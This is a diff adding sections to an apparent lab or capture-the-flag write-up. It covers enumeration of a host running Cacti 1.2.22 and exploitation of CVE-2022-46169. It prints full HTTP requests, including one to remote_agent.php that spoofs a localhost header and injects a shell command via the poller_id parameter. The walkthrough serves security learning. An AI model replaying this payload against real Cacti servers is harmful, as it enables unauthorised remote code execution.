@@ -37,6 +37,74 @@ Result:
 <br>
 
 # 2. Web Enumeration
-There was no hidden directory or subdomains existed on the [web page](./) as a result of fuzzing. For more enumeration, hydra was also used for bruteforcing against web application, but no significant information was found.
+There was no hidden directory or subdomains existed on the [web page](./images/new.png) as a result of fuzzing. For more enumeration, hydra was also used for bruteforcing against web application, but no significant information was found. The web application was running by `Cacti 1.2.22`.
+
+## BurpSuite
+For further enumeration, `BurpSuite` was used against target how web application reacts when it is triggered. Intercepting the login request, the following result was shown.
+(picture)
+
+# 3. Exploitation
+## 1. CVE-2022-46169
+`Cacti 1.2.22` was discovered that it is vulnerable against `Cacti RCE` (CVE-2022-46169). Several attempt of exploiting the vulnerability, accessing the internal system via RCE was successful.
+
+<br>
+
+1. Send the intercepted request to `repeater` and change the request method
+```
+GET /index.php?__csrf_magic=sid%3A4e720e8aae8196d8ee3bbea3dcff20ce810a322a%2C1792046253&action=login&login_username=username&login_password=password HTTP/1.1
+Host: 10.129.228.231
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Origin: http://10.129.228.231
+Connection: keep-alive
+Referer: http://10.129.228.231/index.php
+Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a4d9ef4fd0e4208d67650d4340cbed14
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+<br>
+
+2. Switch `index.php` with `remote_agent.php`, which contains target parameter for exploitation. It is discovered that using `poller_id` parameter as cmd allowed Remote Code Execution to internal server.
+```
+GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`<bash>` HTTP/1.1
+X-Forwarded-For: 127.0.0.1
+Host: 10.129.228.231
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Origin: http://10.129.228.231
+Connection: keep-alive
+Referer: http://10.129.228.231/index.php
+Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a4d9ef4fd0e4208d67650d4340cbed14
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+```
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
